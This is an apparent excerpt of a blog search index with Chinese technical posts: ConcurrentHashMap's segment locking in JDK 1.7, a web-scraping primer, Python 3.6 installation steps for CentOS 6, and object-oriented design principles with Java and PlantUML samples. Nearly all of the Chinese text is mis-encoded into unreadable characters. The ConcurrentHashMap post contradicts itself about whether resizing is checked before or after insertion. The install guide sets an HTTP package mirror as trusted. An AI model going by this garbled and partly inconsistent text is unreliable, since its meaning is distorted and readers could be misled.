    <url>%2F2018%2F07%2F09%2FJava%2FInterview%2FJava-Interview%2FConcurrentHashMap%2F</url>
    <content type="text"><![CDATA[ConcurrentHashMap å®ç°åŸç†ç”±äº HashMap æ˜¯ä¸€ä¸ªçº¿ç¨‹ä¸å®‰å…¨çš„å®¹å™¨ï¼Œä¸»è¦ä½“ç°åœ¨å®¹é‡å¤§äºæ€»é‡*è´Ÿè½½å› å­å‘ç”Ÿæ‰©å®¹æ—¶ä¼šå‡ºç°ç¯å½¢é“¾è¡¨ä»è€Œå¯¼è‡´æ­»å¾ªç¯ã€‚ å› æ­¤éœ€è¦æ”¯æŒçº¿ç¨‹å®‰å…¨çš„å¹¶å‘å®¹å™¨ ConcurrentHashMap ã€‚ æ•°æ®ç»“æ„ å¦‚å›¾æ‰€ç¤ºï¼Œæ˜¯ç”± Segment æ•°ç»„ã€HashEntry æ•°ç»„ç»„æˆï¼Œå’Œ HashMap ä¸€æ ·ï¼Œä»ç„¶æ˜¯æ•°ç»„åŠ é“¾è¡¨ç»„æˆã€‚ ConcurrentHashMap é‡‡ç”¨äº†åˆ†æ®µé”æŠ€æœ¯ï¼Œå…¶ä¸­ Segment ç»§æ‰¿äº ReentrantLockã€‚ä¸ä¼šåƒ HashTable é‚£æ ·ä¸ç®¡æ˜¯ put è¿˜æ˜¯ get æ“ä½œéƒ½éœ€è¦åšåŒæ­¥å¤„ç†ï¼Œç†è®ºä¸Š ConcurrentHashMap æ”¯æŒ CurrencyLevel (Segment æ•°ç»„æ•°é‡)çš„çº¿ç¨‹å¹¶å‘ã€‚æ¯å½“ä¸€ä¸ªçº¿ç¨‹å ç”¨é”è®¿é—®ä¸€ä¸ª Segment æ—¶ï¼Œä¸ä¼šå½±å“åˆ°å…¶ä»–çš„ Segmentã€‚ get æ–¹æ³•ConcurrentHashMap çš„ get æ–¹æ³•æ˜¯éå¸¸é«˜æ•ˆçš„ï¼Œå› ä¸ºæ•´ä¸ªè¿‡ç¨‹éƒ½ä¸éœ€è¦åŠ é”ã€‚ åªéœ€è¦å°† Key é€šè¿‡ Hash ä¹‹åå®šä½åˆ°å…·ä½“çš„ Segment ï¼Œå†é€šè¿‡ä¸€æ¬¡ Hash å®šä½åˆ°å…·ä½“çš„å…ƒç´ ä¸Šã€‚ç”±äº HashEntry ä¸­çš„ value å±æ€§æ˜¯ç”¨ volatile å…³é”®è¯ä¿®é¥°çš„ï¼Œä¿è¯äº†å†…å­˜å¯è§æ€§ï¼Œæ‰€ä»¥æ¯æ¬¡è·å–æ—¶éƒ½æ˜¯æœ€æ–°å€¼(volatile ç›¸å…³çŸ¥è¯†ç‚¹)ã€‚ put æ–¹æ³•å†…éƒ¨ HashEntry ç±» ï¼š12345678910111213static final class HashEntry&lt;K,V&gt; &#123; final int hash; final K key; volatile V value; volatile HashEntry&lt;K,V&gt; next; HashEntry(int hash, K key, V value, HashEntry&lt;K,V&gt; next) &#123; this.hash = hash; this.key = key; this.value = value; this.next = next; &#125;&#125; è™½ç„¶ HashEntry ä¸­çš„ value æ˜¯ç”¨ volatile å…³é”®è¯ä¿®é¥°çš„ï¼Œä½†æ˜¯å¹¶ä¸èƒ½ä¿è¯å¹¶å‘çš„åŸå­æ€§ï¼Œæ‰€ä»¥ put æ“ä½œæ—¶ä»ç„¶éœ€è¦åŠ é”å¤„ç†ã€‚ é¦–å…ˆä¹Ÿæ˜¯é€šè¿‡ Key çš„ Hash å®šä½åˆ°å…·ä½“çš„ Segmentï¼Œåœ¨ put ä¹‹å‰ä¼šè¿›è¡Œä¸€æ¬¡æ‰©å®¹æ ¡éªŒã€‚è¿™é‡Œæ¯” HashMap è¦å¥½çš„ä¸€ç‚¹æ˜¯ï¼šHashMap æ˜¯æ’å…¥å…ƒç´ ä¹‹åå†çœ‹æ˜¯å¦éœ€è¦æ‰©å®¹ï¼Œæœ‰å¯èƒ½æ‰©å®¹ä¹‹ååç»­å°±æ²¡æœ‰æ’å…¥å°±æµªè´¹äº†æœ¬æ¬¡æ‰©å®¹(æ‰©å®¹éå¸¸æ¶ˆè€—æ€§èƒ½)ã€‚ è€Œ ConcurrentHashMap ä¸ä¸€æ ·ï¼Œå®ƒæ˜¯å…ˆå°†æ•°æ®æ’å…¥ä¹‹åå†æ£€æŸ¥æ˜¯å¦éœ€è¦æ‰©å®¹ï¼Œä¹‹åå†åšæ’å…¥ã€‚ size æ–¹æ³•æ¯ä¸ª Segment éƒ½æœ‰ä¸€ä¸ª volatile ä¿®é¥°çš„å…¨å±€å˜é‡ count ,æ±‚æ•´ä¸ª ConcurrentHashMap çš„ size æ—¶å¾ˆæ˜æ˜¾å°±æ˜¯å°†æ‰€æœ‰çš„ count ç´¯åŠ å³å¯ã€‚ä½†æ˜¯ volatile ä¿®é¥°çš„å˜é‡å´ä¸èƒ½ä¿è¯å¤šçº¿ç¨‹çš„åŸå­æ€§ï¼Œæ‰€æœ‰ç›´æ¥ç´¯åŠ å¾ˆå®¹æ˜“å‡ºç°å¹¶å‘é—®é¢˜ã€‚ ä½†å¦‚æœæ¯æ¬¡è°ƒç”¨ size æ–¹æ³•å°†å…¶ä½™çš„ä¿®æ”¹æ“ä½œåŠ é”æ•ˆç‡ä¹Ÿå¾ˆä½ã€‚æ‰€ä»¥åšæ³•æ˜¯å…ˆå°è¯•ä¸¤æ¬¡å°† count ç´¯åŠ ï¼Œå¦‚æœå®¹å™¨çš„ count å‘ç”Ÿäº†å˜åŒ–å†åŠ é”æ¥ç»Ÿè®¡ sizeã€‚ è‡³äº ConcurrentHashMap æ˜¯å¦‚ä½•çŸ¥é“åœ¨ç»Ÿè®¡æ—¶å¤§å°å‘ç”Ÿäº†å˜åŒ–å‘¢ï¼Œæ¯ä¸ª Segment éƒ½æœ‰ä¸€ä¸ª modCount å˜é‡ï¼Œæ¯å½“è¿›è¡Œä¸€æ¬¡ put remove ç­‰æ“ä½œï¼ŒmodCount å°†ä¼š +1ã€‚åªè¦ modCount å‘ç”Ÿäº†å˜åŒ–å°±è®¤ä¸ºå®¹å™¨çš„å¤§å°ä¹Ÿåœ¨å‘ç”Ÿå˜åŒ–ã€‚ ä»¥ä¸Šå†…å®¹ base JDK1.7ï¼Œ1.8 çš„å®ç°æ›´åŠ å¤æ‚ä½†æ˜¯åŸç†ç±»ä¼¼ï¼Œå»ºè®®åœ¨ 1.7 çš„åŸºç¡€ä¸ŠæŸ¥çœ‹æºç ã€‚]]></content>
      <categories>
        <category>Github</category>
        <category>Java-Interview</category>
      </categories>
      <tags>
        <tag>æŠ€æœ¯</tag>
        <tag>Java</tag>
        <tag>è½¬è½½</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[çˆ¬è™«çš„ç®€å•å…¥é—¨]]></title>
    <url>%2F2018%2F07%2F06%2FPython%2FPython%E7%AE%80%E5%8D%95%E5%85%A5%E9%97%A8%2F</url>
    <content type="text"><![CDATA[1.æ•°æ®æ¥æº ä¸šåŠ¡åº“ æ—¥å¿—æ•°æ® å…¬å…±æ•°æ® è´­ä¹° â€“ å€’å– â€“ æœ‰æ³•å¾‹é£é™© 2.çˆ¬è™«å·¥ç¨‹å¸ˆæŠ€èƒ½æ¸…å• pythonç¼–ç¨‹è¯­è¨€åŸºç¡€ HTTPåè®® html,css,javascriptåŸºæœ¬webæŠ€èƒ½ mysql/mongodb/redisç­‰å­˜å‚¨ç³»ç»Ÿ scrapy/pyspider/django æŠ“åŒ…å·¥å…·å’Œç½‘é¡µåˆ†æå·¥å…·(æ­£åˆ™ï¼Œbs4ï¼Œxpathï¼Œselenuim) json/csv/db 3.Python3åŸºç¡€å†…å®¹å»–é›ªå³°Python3æ•™ç¨‹(æ–‡æ¡£)èœé¸Ÿæ•™ç¨‹Python3æ•™ç¨‹(æ–‡æ¡£) pythonç¼–ç¨‹è¯­è¨€ç®€å•ä»‹ç»ï¼ˆäº§ç”ŸèƒŒæ™¯ï¼Œä¼˜ç¼ºç‚¹ï¼Œæµè¡Œåº¦ï¼‰pythonçš„å¼€å‘ç¯å¢ƒæ­å»ºï¼ˆlinuxï¼Œwindowsï¼Œpythonï¼Œpycharmï¼‰pythonçš„hello worldpythonå…³é”®å­—æŸ¥çœ‹pythonçš„å˜é‡å®šä¹‰pythonçš„æ•°æ®ç±»å‹ï¼ˆNumber String List Tuple Set Dictï¼‰pythonçš„æ³¨é‡Šï¼ˆå•è¡Œå’Œæ®µè½ï¼‰pythonçš„è¾“å…¥è¾“å‡ºï¼ˆprint å’Œ inputï¼‰pythonæ•°æ®ç±»å‹è½¬æ¢/å¸¸ç”¨æ•°å€¼è¿ç®—/ç±»å‹åˆ¤æ–­pythonçš„é›†åˆï¼Œåˆ—è¡¨ï¼Œå…ƒç»„ï¼Œå­—å…¸pythonçš„æµç¨‹æ§åˆ¶forå’Œwhileå’Œifï¼ˆbreakï¼Œ continueï¼Œ passï¼‰pythonçš„åˆ‡ç‰‡pythonçš„ä»£ç ç¼©è¿›ï¼ˆæ¢è¡Œï¼Œæ®µè½ï¼‰pythonå‡½æ•°ï¼ˆè‡ªå®šä¹‰å‡½æ•°ï¼Œå¸¸ç”¨å†…ç½®æ¨¡å—ï¼Œå¸¸ç”¨å‡½æ•°ï¼Œå‡½æ•°è°ƒç”¨ï¼‰pythonå¼‚å¸¸pythonæ¨¡å—ï¼ˆå†…ç½®æ¨¡å—ï¼Œå¯¼å…¥æ¨¡å—ï¼Œè‡ªå®šä¹‰æ¨¡å—ï¼‰pythonè¿­ä»£å™¨å’Œç”Ÿæˆå™¨pythoné¢å‘å¯¹è±¡pythonè¯»å†™æ–‡ä»¶IOpythonæ•°æ®åº“å’ŒJSONå’ŒCSV 3.1 åŸºæœ¬è¯­æ³•è®°å½•1234567891011121314# åŒæ—¶éå†2ä¸ªé•¿åº¦ç›¸åŒçš„ listfor i in range(len(companys)): print(companys[i] + "," + fincs[i]) jobs # å·¥ä½œå²—ä½companys #å…¬å¸åmmoneys # è–ªèµ„edus # å­¦å†exps # ç»éªŒcmptypes # å…¬å¸ç±»å‹fincs # èèµ„çŠ¶æ€true_tags #job æ ‡ç­¾c_b_s # å…¬å¸ä¼˜åŠ¿ 4.æœç´¢å¼•æ“åŸºæœ¬å·¥ä½œåŸç† 5.python åŸºæœ¬æ“ä½œ &amp; çˆ¬è™«ä»£ç 5.1åŸºæœ¬è¯­æ³•https://github.com/airpoet/bigdata/tree/master/Python_Project/python_basic 5.2 é«˜çº§è¯­æ³•(tcp,udp / å¤šçº¿ç¨‹ / é¢å‘å¯¹è±¡OOP / py æ“ä½œ mysql)https://github.com/airpoet/bigdata/tree/master/Python_Project/mypython-1 5.3 çˆ¬è™«https://github.com/airpoet/bigdata/tree/master/Python_Project/spiderDemo 5.5 python ä¸ Hadoop / Spark ç”Ÿæ€çš„äº¤äº’https://github.com/airpoet/bigdata/tree/master/Spark_Project/HBasePythonDemo]]></content>
      <categories>
        <category>Hadoop</category>
        <category>çˆ¬è™«</category>
      </categories>
      <tags>
        <tag>åŸåˆ›</tag>
        <tag>æŠ€æœ¯</tag>
        <tag>Hadoop</tag>
        <tag>çˆ¬è™«</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CentOS6.xä¸‹Python3çš„å®‰è£…]]></title>
    <url>%2F2018%2F07%2F05%2FPython%2FCentOS6.x%E4%B8%8BPython3%E7%9A%84%E5%AE%89%E8%A3%85%2F</url>
    <content type="text"><![CDATA[python-3.6.4åœ¨centos-6.7å®‰è£…ï¼š è¯¦ç»†æ­¥éª¤ï¼š 1ã€å®‰è£…ä¸€äº›ä¾èµ–çš„è½¯ä»¶åŒ…yum -y groupinstall â€œDevelopment toolsâ€yum -y install zlib-devel bzip2-devel openssl-devel ncurses-devel sqlite-devel readline-devel tk-devel gdbm-devel db4-devel libpcap-devel xz-develyum -y install yum-plugin-remove-with-leaves 2ã€ä¸‹è½½Python3.6çš„æºç åŒ…å¹¶ç¼–è¯‘ï¼ˆåœ¨/usr/localç›®å½•ä¸‹ï¼‰wget https://www.python.org/ftp/python/3.6.4/Python-3.6.4.tgztar -vxf Python-3.6.4.tgz -C ~/appscd Python-3.6.4mkdir /usr/local/python3./configure â€“prefix=/usr/local/python3 â€“enable-shared â€“enable-optimizationsmakemake install 3ã€æŠŠæ–°å®‰è£…çš„python3.6æ‹·è´åˆ°/usr/bin/ç›®å½•ä¸‹cp /usr/local/python3/bin/python3.6 /usr/bin/python3.6ç„¶åæ–°å»ºå¿«æ·æ–¹å¼ï¼šln -s /usr/bin/python3.6 /usr/bin/python3 4ã€ä¸€æ­¥æ“ä½œï¼šecho /usr/local/python3/lib/ &gt;&gt; /etc/ld.so.conf.d/local.confldconfig 5ã€éªŒè¯å®‰è£…æ˜¯å¦æˆåŠŸ/usr/bin/python3 â€“version 6ã€é…ç½®ç¯å¢ƒå˜é‡vim /etc/profileexport PYTHON_HOME=/usr/local/python3export PATH=$PATH:$PYTHON_HOME/binsource /etc/profile 7ã€å°è¯•å®‰è£…ä¸€ä¸ªæ¨¡å—pip3 install beautifulsoup4 8ã€ä¿®æ”¹pipæºï¼šmkdir ~/.pipcd ~/.pipvi pip.conf[global]trusted-host = pypi.douban.comindex-url = http://pypi.douban.com/simple 9ã€å®‰è£…numpypip3 install numpy]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>åŸåˆ›</tag>
        <tag>æŠ€æœ¯</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[é¢å‘å¯¹è±¡æ€æƒ³]]></title>
    <url>%2F2018%2F07%2F04%2FJava%2FInterview%2FInterview-Notebook%2F%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E6%80%9D%E6%83%B3%2F</url>
    <content type="text"><![CDATA[ä¸€ã€ä¸‰å¤§ç‰¹æ€§ å°è£… ç»§æ‰¿ å¤šæ€ äºŒã€ç±»å›¾ æ³›åŒ–å…³ç³» (Generalization) å®ç°å…³ç³» (Realization) èšåˆå…³ç³» (Aggregation) ç»„åˆå…³ç³» (Composition) å…³è”å…³ç³» (Association) ä¾èµ–å…³ç³» (Dependency) ä¸‰ã€è®¾è®¡åŸåˆ™ S.O.L.I.D å…¶ä»–å¸¸è§åŸåˆ™ å‚è€ƒèµ„æ–™ ä¸€ã€ä¸‰å¤§ç‰¹æ€§å°è£…åˆ©ç”¨æŠ½è±¡æ•°æ®ç±»å‹å°†æ•°æ®å’ŒåŸºäºæ•°æ®çš„æ“ä½œå°è£…åœ¨ä¸€èµ·ï¼Œä½¿å…¶æ„æˆä¸€ä¸ªä¸å¯åˆ†å‰²çš„ç‹¬ç«‹å®ä½“ã€‚æ•°æ®è¢«ä¿æŠ¤åœ¨æŠ½è±¡æ•°æ®ç±»å‹çš„å†…éƒ¨ï¼Œå°½å¯èƒ½åœ°éšè—å†…éƒ¨çš„ç»†èŠ‚ï¼Œåªä¿ç•™ä¸€äº›å¯¹å¤–æ¥å£ä½¿ä¹‹ä¸å¤–éƒ¨å‘ç”Ÿè”ç³»ã€‚ç”¨æˆ·æ— éœ€çŸ¥é“å¯¹è±¡å†…éƒ¨çš„ç»†èŠ‚ï¼Œä½†å¯ä»¥é€šè¿‡å¯¹è±¡å¯¹å¤–æä¾›çš„æ¥å£æ¥è®¿é—®è¯¥å¯¹è±¡ã€‚ ä¼˜ç‚¹ï¼š å‡å°‘è€¦åˆï¼šå¯ä»¥ç‹¬ç«‹åœ°å¼€å‘ã€æµ‹è¯•ã€ä¼˜åŒ–ã€ä½¿ç”¨ã€ç†è§£å’Œä¿®æ”¹ å‡è½»ç»´æŠ¤çš„è´Ÿæ‹…ï¼šå¯ä»¥æ›´å®¹æ˜“è¢«ç¨‹åºå‘˜ç†è§£ï¼Œå¹¶ä¸”åœ¨è°ƒè¯•çš„æ—¶å€™å¯ä»¥ä¸å½±å“å…¶ä»–æ¨¡å— æœ‰æ•ˆåœ°è°ƒèŠ‚æ€§èƒ½ï¼šå¯ä»¥é€šè¿‡å‰–æç¡®å®šå“ªäº›æ¨¡å—å½±å“äº†ç³»ç»Ÿçš„æ€§èƒ½ æé«˜è½¯ä»¶çš„å¯é‡ç”¨æ€§ é™ä½äº†æ„å»ºå¤§å‹ç³»ç»Ÿçš„é£é™©ï¼šå³ä½¿æ•´ä¸ªç³»ç»Ÿä¸å¯ç”¨ï¼Œä½†æ˜¯è¿™äº›ç‹¬ç«‹çš„æ¨¡å—å´æœ‰å¯èƒ½æ˜¯å¯ç”¨çš„ ä»¥ä¸‹ Person ç±»å°è£… nameã€genderã€age ç­‰å±æ€§ï¼Œå¤–ç•Œåªèƒ½é€šè¿‡ get() æ–¹æ³•è·å–ä¸€ä¸ª Person å¯¹è±¡çš„ name å±æ€§å’Œ gender å±æ€§ï¼Œè€Œæ— æ³•è·å– age å±æ€§ï¼Œä½†æ˜¯ age å±æ€§å¯ä»¥ä¾› work() æ–¹æ³•ä½¿ç”¨ã€‚ æ³¨æ„åˆ° gender å±æ€§ä½¿ç”¨ int æ•°æ®ç±»å‹è¿›è¡Œå­˜å‚¨ï¼Œå°è£…ä½¿å¾—ç”¨æˆ·æ³¨æ„ä¸åˆ°è¿™ç§å®ç°ç»†èŠ‚ã€‚å¹¶ä¸”åœ¨éœ€è¦ä¿®æ”¹ gender å±æ€§ä½¿ç”¨çš„æ•°æ®ç±»å‹æ—¶ï¼Œä¹Ÿå¯ä»¥åœ¨ä¸å½±å“å®¢æˆ·ç«¯ä»£ç çš„æƒ…å†µä¸‹è¿›è¡Œã€‚ 123456789101112131415161718192021public class Person &#123; private String name; private int gender; private int age; public String getName() &#123; return name; &#125; public String getGender() &#123; return gender == 0 ? "man" : "woman"; &#125; public void work() &#123; if (18 &lt;= age &amp;&amp; age &lt;= 50) &#123; System.out.println(name + " is working very hard!"); &#125; else &#123; System.out.println(name + " can't work any more!"); &#125; &#125;&#125; ç»§æ‰¿ç»§æ‰¿å®ç°äº† IS-A å…³ç³»ï¼Œä¾‹å¦‚ Cat å’Œ Animal å°±æ˜¯ä¸€ç§ IS-A å…³ç³»ï¼Œå› æ­¤ Cat å¯ä»¥ç»§æ‰¿è‡ª Animalï¼Œä»è€Œè·å¾— Animal é private çš„å±æ€§å’Œæ–¹æ³•ã€‚ Cat å¯ä»¥å½“åš Animal æ¥ä½¿ç”¨ï¼Œä¹Ÿå°±æ˜¯è¯´å¯ä»¥ä½¿ç”¨ Animal å¼•ç”¨ Cat å¯¹è±¡ã€‚çˆ¶ç±»å¼•ç”¨æŒ‡å‘å­ç±»å¯¹è±¡ç§°ä¸º å‘ä¸Šè½¬å‹ ã€‚ 1Animal animal = new Cat(); ç»§æ‰¿åº”è¯¥éµå¾ªé‡Œæ°æ›¿æ¢åŸåˆ™ï¼Œå­ç±»å¯¹è±¡å¿…é¡»èƒ½å¤Ÿæ›¿æ¢æ‰æ‰€æœ‰çˆ¶ç±»å¯¹è±¡ã€‚ å¤šæ€å¤šæ€åˆ†ä¸ºç¼–è¯‘æ—¶å¤šæ€å’Œè¿è¡Œæ—¶å¤šæ€ã€‚ç¼–è¯‘æ—¶å¤šæ€ä¸»è¦æŒ‡æ–¹æ³•çš„é‡è½½ï¼Œè¿è¡Œæ—¶å¤šæ€æŒ‡ç¨‹åºä¸­å®šä¹‰çš„å¯¹è±¡å¼•ç”¨æ‰€æŒ‡å‘çš„å…·ä½“ç±»å‹åœ¨è¿è¡ŒæœŸé—´æ‰ç¡®å®šã€‚ è¿è¡Œæ—¶å¤šæ€æœ‰ä¸‰ä¸ªæ¡ä»¶ï¼š ç»§æ‰¿ è¦†ç›–ï¼ˆé‡å†™ï¼‰ å‘ä¸Šè½¬å‹ ä¸‹é¢çš„ä»£ç ä¸­ï¼Œä¹å™¨ç±»ï¼ˆInstrumentï¼‰æœ‰ä¸¤ä¸ªå­ç±»ï¼šWind å’Œ Percussionï¼Œå®ƒä»¬éƒ½è¦†ç›–äº†çˆ¶ç±»çš„ play() æ–¹æ³•ï¼Œå¹¶ä¸”åœ¨ main() æ–¹æ³•ä¸­ä½¿ç”¨çˆ¶ç±» Instrument æ¥å¼•ç”¨ Wind å’Œ Percussion å¯¹è±¡ã€‚åœ¨ Instrument å¼•ç”¨è°ƒç”¨ play() æ–¹æ³•æ—¶ï¼Œä¼šæ‰§è¡Œå®é™…å¼•ç”¨å¯¹è±¡æ‰€åœ¨ç±»çš„ play() æ–¹æ³•ï¼Œè€Œä¸æ˜¯ Instrument ç±»çš„æ–¹æ³•ã€‚ 12345678910111213141516171819202122232425262728public class Instrument &#123; public void play() &#123; System.out.println("Instument is playing..."); &#125;&#125;public class Wind extends Instrument &#123; public void play() &#123; System.out.println("Wind is playing..."); &#125;&#125;public class Percussion extends Instrument &#123; public void play() &#123; System.out.println("Percussion is playing..."); &#125;&#125;public class Music &#123; public static void main(String[] args) &#123; List&lt;Instrument&gt; instruments = new ArrayList&lt;&gt;(); instruments.add(new Wind()); instruments.add(new Percussion()); for(Instrument instrument : instruments) &#123; instrument.play(); &#125; &#125;&#125; äºŒã€ç±»å›¾ä»¥ä¸‹ç±»å›¾ä½¿ç”¨ PlantUML ç»˜åˆ¶ï¼Œæ›´å¤šè¯­æ³•åŠä½¿ç”¨è¯·å‚è€ƒï¼šhttp://plantuml.com/ æ³›åŒ–å…³ç³» (Generalization)ç”¨æ¥æè¿°ç»§æ‰¿å…³ç³»ï¼Œåœ¨ Java ä¸­ä½¿ç”¨ extends å…³é”®å­—ã€‚ 123456789101112@startumltitle Generalizationclass Vihicalclass Carclass TrunckVihical &lt;|-- CarVihical &lt;|-- Trunck@enduml å®ç°å…³ç³» (Realization)ç”¨æ¥å®ç°ä¸€ä¸ªæ¥å£ï¼Œåœ¨ Java ä¸­ä½¿ç”¨ implement å…³é”®å­—ã€‚ 123456789101112@startumltitle Realizationinterface MoveBehaviorclass Flyclass RunMoveBehavior &lt;|.. FlyMoveBehavior &lt;|.. Run@enduml èšåˆå…³ç³» (Aggregation)è¡¨ç¤ºæ•´ä½“ç”±éƒ¨åˆ†ç»„æˆï¼Œä½†æ˜¯æ•´ä½“å’Œéƒ¨åˆ†ä¸æ˜¯å¼ºä¾èµ–çš„ï¼Œæ•´ä½“ä¸å­˜åœ¨äº†éƒ¨åˆ†è¿˜æ˜¯ä¼šå­˜åœ¨ã€‚ 1234567891011121314@startumltitle Aggregationclass Computerclass Keyboardclass Mouseclass ScreenComputer o-- KeyboardComputer o-- MouseComputer o-- Screen@enduml ç»„åˆå…³ç³» (Composition)å’Œèšåˆä¸åŒï¼Œç»„åˆä¸­æ•´ä½“å’Œéƒ¨åˆ†æ˜¯å¼ºä¾èµ–çš„ï¼Œæ•´ä½“ä¸å­˜åœ¨äº†éƒ¨åˆ†ä¹Ÿä¸å­˜åœ¨äº†ã€‚æ¯”å¦‚å…¬å¸å’Œéƒ¨é—¨ï¼Œå…¬å¸æ²¡äº†éƒ¨é—¨å°±ä¸å­˜åœ¨äº†ã€‚ä½†æ˜¯å…¬å¸å’Œå‘˜å·¥å°±å±äºèšåˆå…³ç³»äº†ï¼Œå› ä¸ºå…¬å¸æ²¡äº†å‘˜å·¥è¿˜åœ¨ã€‚ 123456789101112@startumltitle Compositionclass Companyclass DepartmentAclass DepartmentBCompany *-- DepartmentACompany *-- DepartmentB@enduml å…³è”å…³ç³» (Association)è¡¨ç¤ºä¸åŒç±»å¯¹è±¡ä¹‹é—´æœ‰å…³è”ï¼Œè¿™æ˜¯ä¸€ç§é™æ€å…³ç³»ï¼Œä¸è¿è¡Œè¿‡ç¨‹çš„çŠ¶æ€æ— å…³ï¼Œåœ¨æœ€å¼€å§‹å°±å¯ä»¥ç¡®å®šã€‚å› æ­¤ä¹Ÿå¯ä»¥ç”¨ 1 å¯¹ 1ã€å¤šå¯¹ 1ã€å¤šå¯¹å¤šè¿™ç§å…³è”å…³ç³»æ¥è¡¨ç¤ºã€‚æ¯”å¦‚å­¦ç”Ÿå’Œå­¦æ ¡å°±æ˜¯ä¸€ç§å…³è”å…³ç³»ï¼Œä¸€ä¸ªå­¦æ ¡å¯ä»¥æœ‰å¾ˆå¤šå­¦ç”Ÿï¼Œä½†æ˜¯ä¸€ä¸ªå­¦ç”Ÿåªå±äºä¸€ä¸ªå­¦æ ¡ï¼Œå› æ­¤è¿™æ˜¯ä¸€ç§å¤šå¯¹ä¸€çš„å…³ç³»ï¼Œåœ¨è¿è¡Œå¼€å§‹ä¹‹å‰å°±å¯ä»¥ç¡®å®šã€‚ 12345678910@startumltitle Associationclass Schoolclass StudentSchool &quot;1&quot; - &quot;n&quot; Student@enduml ä¾èµ–å…³ç³» (Dependency)å’Œå…³è”å…³ç³»ä¸åŒçš„æ˜¯ï¼Œä¾èµ–å…³ç³»æ˜¯åœ¨è¿è¡Œè¿‡ç¨‹ä¸­èµ·ä½œç”¨çš„ã€‚A ç±»å’Œ B ç±»æ˜¯ä¾èµ–å…³ç³»ä¸»è¦æœ‰ä¸‰ç§å½¢å¼ï¼š A ç±»æ˜¯ B ç±»ä¸­çš„ï¼ˆæŸä¸­æ–¹æ³•çš„ï¼‰å±€éƒ¨å˜é‡ï¼› A ç±»æ˜¯ B ç±»æ–¹æ³•å½“ä¸­çš„ä¸€ä¸ªå‚æ•°ï¼› A ç±»å‘ B ç±»å‘é€æ¶ˆæ¯ï¼Œä»è€Œå½±å“ B ç±»å‘ç”Ÿå˜åŒ–ï¼› 12345678910111213141516171819@startumltitle Dependencyclass Vihicle &#123; move(MoveBehavior)&#125;interface MoveBehavior &#123; move()&#125;note &quot;MoveBehavior.move()&quot; as NVihicle ..&gt; MoveBehaviorVihicle .. N@enduml ä¸‰ã€è®¾è®¡åŸåˆ™S.O.L.I.D ç®€å†™ å…¨æ‹¼ ä¸­æ–‡ç¿»è¯‘ SRP The Single Responsibility Principle å•ä¸€è´£ä»»åŸåˆ™ OCP The Open Closed Principle å¼€æ”¾å°é—­åŸåˆ™ LSP The Liskov Substitution Principle é‡Œæ°æ›¿æ¢åŸåˆ™ ISP The Interface Segregation Principle æ¥å£åˆ†ç¦»åŸåˆ™ DIP The Dependency Inversion Principle ä¾èµ–å€’ç½®åŸåˆ™ 1. å•ä¸€è´£ä»»åŸåˆ™ ä¿®æ”¹ä¸€ä¸ªç±»çš„åŸå› åº”è¯¥åªæœ‰ä¸€ä¸ªã€‚ æ¢å¥è¯è¯´å°±æ˜¯è®©ä¸€ä¸ªç±»åªè´Ÿè´£ä¸€ä»¶äº‹ï¼Œå½“è¿™ä¸ªç±»éœ€è¦åšè¿‡å¤šäº‹æƒ…çš„æ—¶å€™ï¼Œå°±éœ€è¦åˆ†è§£è¿™ä¸ªç±»ã€‚ å¦‚æœä¸€ä¸ªç±»æ‰¿æ‹…çš„èŒè´£è¿‡å¤šï¼Œå°±ç­‰äºæŠŠè¿™äº›èŒè´£è€¦åˆåœ¨äº†ä¸€èµ·ï¼Œä¸€ä¸ªèŒè´£çš„å˜åŒ–å¯èƒ½ä¼šå‰Šå¼±è¿™ä¸ªç±»å®Œæˆå…¶å®ƒèŒè´£çš„èƒ½åŠ›ã€‚ 2. å¼€æ”¾å°é—­åŸåˆ™ ç±»åº”è¯¥å¯¹æ‰©å±•å¼€æ”¾ï¼Œå¯¹ä¿®æ”¹å…³é—­ã€‚ æ‰©å±•å°±æ˜¯æ·»åŠ æ–°åŠŸèƒ½çš„æ„æ€ï¼Œå› æ­¤è¯¥åŸåˆ™è¦æ±‚åœ¨æ·»åŠ æ–°åŠŸèƒ½æ—¶ä¸éœ€è¦ä¿®æ”¹ä»£ç ã€‚ ç¬¦åˆå¼€é—­åŸåˆ™æœ€å…¸å‹çš„è®¾è®¡æ¨¡å¼æ˜¯è£…é¥°è€…æ¨¡å¼ï¼Œå®ƒå¯ä»¥åŠ¨æ€åœ°å°†è´£ä»»é™„åŠ åˆ°å¯¹è±¡ä¸Šï¼Œè€Œä¸ç”¨å»ä¿®æ”¹ç±»çš„ä»£ç ã€‚ 3. é‡Œæ°æ›¿æ¢åŸåˆ™ å­ç±»å¯¹è±¡å¿…é¡»èƒ½å¤Ÿæ›¿æ¢æ‰æ‰€æœ‰çˆ¶ç±»å¯¹è±¡ã€‚ ç»§æ‰¿æ˜¯ä¸€ç§ IS-A å…³ç³»ï¼Œå­ç±»éœ€è¦èƒ½å¤Ÿå½“æˆçˆ¶ç±»æ¥ä½¿ç”¨ï¼Œå¹¶ä¸”éœ€è¦æ¯”çˆ¶ç±»æ›´ç‰¹æ®Šã€‚ å¦‚æœä¸æ»¡è¶³è¿™ä¸ªåŸåˆ™ï¼Œé‚£ä¹ˆå„ä¸ªå­ç±»çš„è¡Œä¸ºä¸Šå°±ä¼šæœ‰å¾ˆå¤§å·®å¼‚ï¼Œå¢åŠ ç»§æ‰¿ä½“ç³»çš„å¤æ‚åº¦ã€‚ 4. æ¥å£åˆ†ç¦»åŸåˆ™ ä¸åº”è¯¥å¼ºè¿«å®¢æˆ·ä¾èµ–äºå®ƒä»¬ä¸ç”¨çš„æ–¹æ³•ã€‚ å› æ­¤ä½¿ç”¨å¤šä¸ªä¸“é—¨çš„æ¥å£æ¯”ä½¿ç”¨å•ä¸€çš„æ€»æ¥å£è¦å¥½ã€‚ 5. ä¾èµ–å€’ç½®åŸåˆ™ é«˜å±‚æ¨¡å—ä¸åº”è¯¥ä¾èµ–äºä½å±‚æ¨¡å—ï¼ŒäºŒè€…éƒ½åº”è¯¥ä¾èµ–äºæŠ½è±¡ï¼›æŠ½è±¡ä¸åº”è¯¥ä¾èµ–äºç»†èŠ‚ï¼Œç»†èŠ‚åº”è¯¥ä¾èµ–äºæŠ½è±¡ã€‚ 